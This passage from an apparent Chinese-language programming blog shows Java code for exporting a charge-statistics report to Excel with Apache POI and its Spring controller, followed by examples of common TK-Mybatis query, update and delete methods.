class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportChargeReportExcel</span><span class="params">(HttpServletResponse response, List&lt;ExportChargeReportVo&gt; list, ExportChargeReportReq req)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Map&lt;String, String&gt; title = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            title.put(<span class="string">&quot;tab0&quot;</span>, <span class="string">&quot;搜索条&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;tab1&quot;</span>, <span class="string">&quot;客户名称&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;tab2&quot;</span>, <span class="string">&quot;产品编码&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;tab3&quot;</span>, <span class="string">&quot;产品名称&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;count0&quot;</span>, <span class="string">&quot;今年累计&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;count1&quot;</span>, <span class="string">&quot;所有累计&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;subtab3&quot;</span>, <span class="string">&quot;请求数量&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;subtab4&quot;</span>, <span class="string">&quot;计费请求数量&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;subtab5&quot;</span>, <span class="string">&quot;不计费请求数量&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;subtab6&quot;</span>, <span class="string">&quot;请求数量&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;subtab7&quot;</span>, <span class="string">&quot;计费请求数量&quot;</span>);</span><br><span class="line">            title.put(<span class="string">&quot;subtab8&quot;</span>, <span class="string">&quot;不计费请求数量&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">13</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;接口调用情况统计&quot;</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的第二行</span></span><br><span class="line">            HSSFRow row1 = sheet.createRow(<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 搜索条 客户名称 产品名称</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">                HSSFCell cell = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                    cell = row.createCell(i);</span><br><span class="line">                    cell.setCellValue(title.get(<span class="string">&quot;tab&quot;</span> + i));</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">2</span>)&#123;</span><br><span class="line">                    cell = row1.createCell(i);</span><br><span class="line">                    cell.setCellValue(req.getUserName());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">4</span>) &#123;</span><br><span class="line">                    cell = row1.createCell(i);</span><br><span class="line">                    cell.setCellValue(req.getProductName());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    cell = row1.createCell(i);</span><br><span class="line">                    cell.setCellValue(title.get(<span class="string">&quot;tab&quot;</span> + i));</span><br><span class="line">                &#125;</span><br><span class="line">                cell.setCellStyle(style);</span><br><span class="line">            &#125;</span><br><span class="line">            HSSFCellStyle styleBt = workbook.createCellStyle();</span><br><span class="line">            HSSFFont fontBt = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            fontBt.setBold(<span class="keyword">true</span>);</span><br><span class="line">            fontBt.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">13</span>);</span><br><span class="line">            fontBt.setColor(IndexedColors.WHITE.getIndex());</span><br><span class="line">            styleBt.setFont(fontBt);</span><br><span class="line">            <span class="comment">//设置样式对齐方式：水平垂直居中</span></span><br><span class="line">            styleBt.setAlignment(HorizontalAlignment.CENTER);</span><br><span class="line">            styleBt.setVerticalAlignment(VerticalAlignment.CENTER);</span><br><span class="line">            <span class="comment">//设定填充单色</span></span><br><span class="line">            styleBt.setFillPattern(FillPatternType.SOLID_FOREGROUND);</span><br><span class="line">            <span class="comment">//设定背景颜色</span></span><br><span class="line">            styleBt.setFillForegroundColor(IndexedColors.PALE_BLUE.getIndex());</span><br><span class="line"><span class="comment">//            this.setBorderColor(styleBt, IndexedColors.BLACK.getIndex(), BorderStyle.MEDIUM);</span></span><br><span class="line">            <span class="comment">//创建行，指定起始行号，从0开始</span></span><br><span class="line">            HSSFRow row2 = sheet.createRow(<span class="number">2</span>);</span><br><span class="line">            <span class="comment">// 客户名称 产品编码 产品名称 合并单元格</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">                sheet.autoSizeColumn(i);</span><br><span class="line">                sheet.setColumnWidth(i, <span class="number">6000</span>);</span><br><span class="line">                <span class="comment">//指定合并开始行、合并结束行 合并开始列、合并结束列</span></span><br><span class="line">                CellRangeAddress rangeAddress = <span class="keyword">new</span> CellRangeAddress(<span class="number">2</span>, <span class="number">3</span>, i, i);</span><br><span class="line">                <span class="comment">//添加要合并地址到表格</span></span><br><span class="line">                sheet.addMergedRegion(rangeAddress);</span><br><span class="line">                <span class="comment">//创建单元格，指定起始列号，从0开始</span></span><br><span class="line">                HSSFCell cell = row2.createCell(i);</span><br><span class="line">                <span class="comment">//设置单元格内容</span></span><br><span class="line">                cell.setCellValue(title.get(<span class="string">&quot;tab&quot;</span> + (i + <span class="number">1</span>)));</span><br><span class="line">                cell.setCellStyle(styleBt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 今年累计  所有累计  合并单元格</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">                <span class="comment">//指定合并开始行、合并结束行 合并开始列、合并结束列</span></span><br><span class="line">                CellRangeAddress rangeAddress = <span class="keyword">new</span> CellRangeAddress(<span class="number">2</span>, <span class="number">2</span>, i * <span class="number">3</span> + <span class="number">3</span>, i * <span class="number">3</span> + <span class="number">5</span>);</span><br><span class="line">                <span class="comment">//添加要合并地址到表格</span></span><br><span class="line">                sheet.addMergedRegion(rangeAddress);</span><br><span class="line">                <span class="comment">//创建单元格，指定起始列号，从0开始</span></span><br><span class="line">                HSSFCell cell = row2.createCell(i * <span class="number">3</span> + <span class="number">3</span>);</span><br><span class="line">                <span class="comment">//设置单元格内容</span></span><br><span class="line">                cell.setCellValue(title.get(<span class="string">&quot;count&quot;</span> + i));</span><br><span class="line">                cell.setCellStyle(styleBt);</span><br><span class="line">            &#125;</span><br><span class="line">            HSSFRow row3 = sheet.createRow(<span class="number">3</span>);</span><br><span class="line">            <span class="comment">// 请求数量 计费请求数量 不计费请求数量</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line">                sheet.autoSizeColumn(i);</span><br><span class="line">                sheet.setColumnWidth(i, <span class="number">6000</span>);</span><br><span class="line">                HSSFCell cell = row3.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(<span class="string">&quot;subtab&quot;</span> + i));</span><br><span class="line">                cell.setCellStyle(styleBt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">11</span>);</span><br><span class="line">            cellStyle.setFont(font);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">4</span>);</span><br><span class="line">                ExportChargeReportVo chargeReport = list.get(j);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">9</span>; k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            <span class="keyword">if</span> (StringUtils.isNotBlank(chargeReport.getReportAccountName())) &#123;</span><br><span class="line">                                cell.setCellValue(chargeReport.getReportAccountName());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            <span class="keyword">if</span> (StringUtils.isNotBlank(chargeReport.getReportDataCode())) &#123;</span><br><span class="line">                                cell.setCellValue(chargeReport.getReportDataCode());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            <span class="keyword">if</span> (StringUtils.isNotBlank(chargeReport.getReportDataName())) &#123;</span><br><span class="line">                                cell.setCellValue(chargeReport.getReportDataName());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            <span class="keyword">if</span> (chargeReport.getReportNum() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(chargeReport.getReportNum());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                            <span class="keyword">if</span> (chargeReport.getReportFeeNum() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(chargeReport.getReportFeeNum());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                            <span class="keyword">if</span> (chargeReport.getReportFreeNum() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(chargeReport.getReportFreeNum());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                            <span class="keyword">if</span> (chargeReport.getReportAllNum() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(chargeReport.getReportAllNum());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                            <span class="keyword">if</span> (chargeReport.getReportFeeAllNum() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(chargeReport.getReportFeeAllNum());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                            <span class="keyword">if</span> (chargeReport.getReportFreeAllNum() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(chargeReport.getReportFreeAllNum());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ExcelExportUtil对应controller类"><a href="#ExcelExportUtil对应controller类" class="headerlink" title="ExcelExportUtil对应controller类"></a>ExcelExportUtil对应controller类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(&quot;接口调用情况统计-导出数据&quot;)</span></span><br><span class="line">  <span class="meta">@PostMapping(&quot;exportV2&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportV2</span><span class="params">(<span class="meta">@RequestBody</span> ExportChargeReportReq req,</span></span></span><br><span class="line"><span class="function"><span class="params">                     HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">      log.info(<span class="string">&quot;对外API 接口调用情况统计-导出数据,请求参数:&#123;&#125;&quot;</span>, JSONObject.toJSONString(req));</span><br><span class="line">      List&lt;ExportChargeReportVo&gt; exportChargeReport = chargeReportService.getExportChargeReport(req.getUserName(), req.getProductName());</span><br><span class="line">      log.info(<span class="string">&quot;查得结果条数：&#123;&#125;\n 查询结果：&#123;&#125;&quot;</span>, exportChargeReport.size(), exportChargeReport);</span><br><span class="line">      <span class="keyword">if</span> (!CollectionUtils.isEmpty(exportChargeReport)) &#123;</span><br><span class="line">          <span class="comment">//将选中数据导出到excel</span></span><br><span class="line">          ExcelExportUtil excelExportUtil = <span class="keyword">new</span> ExcelExportUtil();</span><br><span class="line">          excelExportUtil.exportChargeReportExcel(response, exportChargeReport, req);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="Excel图片"><a href="#Excel图片" class="headerlink" title="Excel图片"></a>Excel图片</h3><p><img src="/images/pasted-3.png" alt="upload successful"></p><h2 id="传参数导出"><a href="#传参数导出" class="headerlink" title="传参数导出"></a>传参数导出</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@ApiOperation(&quot;导出&quot;)</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;export&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">export</span><span class="params">(<span class="meta">@RequestBody</span> WinProjectReq winProjectReq, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">//查询要导出的数据</span></span><br><span class="line">        List&lt;WinnerExportVo&gt; list = winProjectService.selectExportList(winProjectReq);</span><br><span class="line">        ExcelUtil&lt;WinnerExportVo&gt; util = <span class="keyword">new</span> ExcelUtil&lt;WinnerExportVo&gt;(WinnerExportVo.class);</span><br><span class="line">        util.exportExcel(response,list, <span class="string">&quot;中标企业名单导出&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="TK-Mybaties常用方法"><a href="#TK-Mybaties常用方法" class="headerlink" title="TK-Mybaties常用方法"></a>TK-Mybaties常用方法</h1><p><img src="/images/pasted-4.png" alt="upload successful"></p><h2 id="1-查全部"><a href="#1-查全部" class="headerlink" title="1.查全部"></a>1.查全部</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查全部</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;SysUser&gt; <span class="title">getUserList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sysUserMapper.selectAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-根据主键id查询"><a href="#2-根据主键id查询" class="headerlink" title="2.根据主键id查询"></a>2.根据主键id查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据主键id查询</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> SysUser <span class="title">getUserById</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span>  sysUserMapper.selectByPrimaryKey(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-根据主键id选择更新"><a href="#3-根据主键id选择更新" class="headerlink" title="3.根据主键id选择更新"></a>3.根据主键id选择更新</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据主键id选择更新    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(SysUser user)</span> </span>&#123;</span><br><span class="line">    sysUserMapper.updateByPrimaryKeySelective(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-根据主键id更新所有"><a href="#4-根据主键id更新所有" class="headerlink" title="4.根据主键id更新所有"></a>4.根据主键id更新所有</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据主键id更新所有</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(SysUser user)</span> </span>&#123;</span><br><span class="line">    sysUserMapper.updateByPrimaryKey(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-根据主键id删除"><a href="#5-根据主键id删除" class="headerlink" title="5.根据主键id删除"></a>5.根据主键id删除</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据主键id删除</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">    sysUserMapper.deleteByPrimaryKey(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-根据条件精确查询"><a href="#6-根据条件精确查询" class="headerlink" title="6.根据条件精确查询"></a>6.根据条件精确查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据条件精确查询    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;SysUser&gt; <span class="title">getUserList</span><span class="params">(String loginName)</span> </span>&#123;</span><br><span class="line">    Example example = <span class="keyword">new</span> Example(SysUser.class);</span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotBlank(loginName))&#123;</span><br><span class="line">        example.createCriteria().andEqualTo(<span class="string">&quot;loginName&quot;</span>, loginName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sysUserMapper.selectByExample(example);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-根据条件模糊查询"><a href="#7-根据条件模糊查询" class="headerlink" title="7.根据条件模糊查询"></a>7.根据条件模糊查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据条件模糊查询    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;SysUser&gt; <span class="title">getUserList</span><span class="params">(String loginName)</span> </span>&#123;</span><br><span class="line">    Example example = <span class="keyword">new</span> Example(SysUser.class);</span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotBlank(loginName))&#123;</span><br><span class="line">        example.createCriteria().andLike(<span class="string">&quot;loginName&quot;</span>, <span class="string">&quot;%&quot;</span> + loginName + <span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sysUserMapper.selectByExample(example);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-根据时间查询并排序"><a href="#8-根据时间查询并排序" class="headerlink" title="8.根据时间查询并排序"></a>8.根据时间查询并排序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据时间查询并排序    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;SysUser&gt; <span class="title">getUserList</span><span class="params">(String startDate, String endDate)</span> </span>&#123;</span><br><span class="line">    Example example = <span class="keyword">new</span> Example(SysUser.class);</span><br><span class="line">    Example.Criteria criteria = example.createCriteria();</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotBlank(startDate)) &#123;</span><br><span class="line">        criteria.andGreaterThanOrEqualTo(<span class="string">&quot;createTime&quot;</span>, startDate);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotBlank(endDate)) &#123;</span><br><span class="line">        criteria.andLessThanOrEqualTo(<span class="string">&quot;createTime&quot;</span>, endDate);</span><br><span class="line">    &#125;</span><br><span class="line">    example.setOrderByClause(<span class="string">&quot;create_time desc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> sysUserMapper.selectByExample(example);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-根据条件选择更新"><a href="#9-根据条件选择更新" class="headerlink" title="9.根据条件选择更新"></a>9.根据条件选择更新</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据条件选择更新    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(SysUser user)</span> </span>&#123;</span><br><span class="line">    Example example = <span class="keyword">new</span> Example(SysUser.class);</span><br><span class="line">    example.createCriteria().andEqualTo(<span class="string">&quot;loginName&quot;</span>, user.getLoginName());</span><br><span class="line">    sysUserMapper.updateByExampleSelective(user, example);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-根据条件更新所有"><a href="#10-根据条件更新所有" class="headerlink" title="10.根据条件更新所有"></a>10.根据条件更新所有</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据条件更新所有    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(SysUser user)</span> </span>&#123;</span><br><span class="line">    Example example = <span class="keyword">new</span> Example(SysUser.class);</span><br><span class="line">    example.createCriteria().andEqualTo(<span class="string">&quot;loginName&quot;</span>, user.getLoginName());</span><br><span class="line">    sysUserMapper.updateByExample(user, example);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="11-根据条件删除"><a href="#11-根据条件删除" class="headerlink" title="11.根据条件删除"></a>11.根据条件删除</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据条件删除    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(String loginName)</span> </span>&#123;</span><br><span class="line">    Example example = <span class="keyword">new</span> Example(SysUser.class);</span><br><span class="line">    example.createCriteria().andEqualTo(<span class="string">&quot;loginName&quot;</span>, loginName);</span><br><span class="line">    sysUserMapper.deleteByExample(example);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-复杂条件查询"><a href="#12-复杂条件查询" class="headerlink" title="12.复杂条件查询"></a>12.复杂条件查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//复杂条件查询    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;SysUser&gt; <span class="title">getUserList</span><span class="params">(String loginName, String password)</span> </span>&#123;</span><br><span class="line">    Example example = <span class="keyword">new</span> Example(SysUser.class);</span><br><span class="line">    Example.Criteria criteria1 = example.createCriteria();</span><br><span class="line">    criteria1.andEqualTo(<span class="string">&quot;loginName&quot;</span>, loginName);</span><br><span class="line">    criteria1.andEqualTo(<span class="string">&quot;password&quot;</span>, password);</span><br><span class="line">    Example.Criteria criteria2 = example.createCriteria();</span><br><span class="line">    criteria2.andEqualTo(<span class="string">&quot;email&quot;</span>, loginName);</span><br><span class="line">    criteria2.andEqualTo(<span class="string">&quot;password&quot;</span>, password);</span><br><span class="line">    example.or(criteria2);</span><br><span class="line">    <span class="keyword">return</span> sysUserMapper.selectByExample(example);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-多表查询"><a href="#13-多表查询" class="headerlink" title="13.多表查询"></a>13.多表查询</h2><p>在mapper文件定义方法名和SQL语句，使用方法:注入对应mapper后，用xxxmapper.方法名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.psds.credit.entity.WarningRules;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.model.FindNamesBody;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Param;</span><br><span class="line"><span class="keyword">import</span> 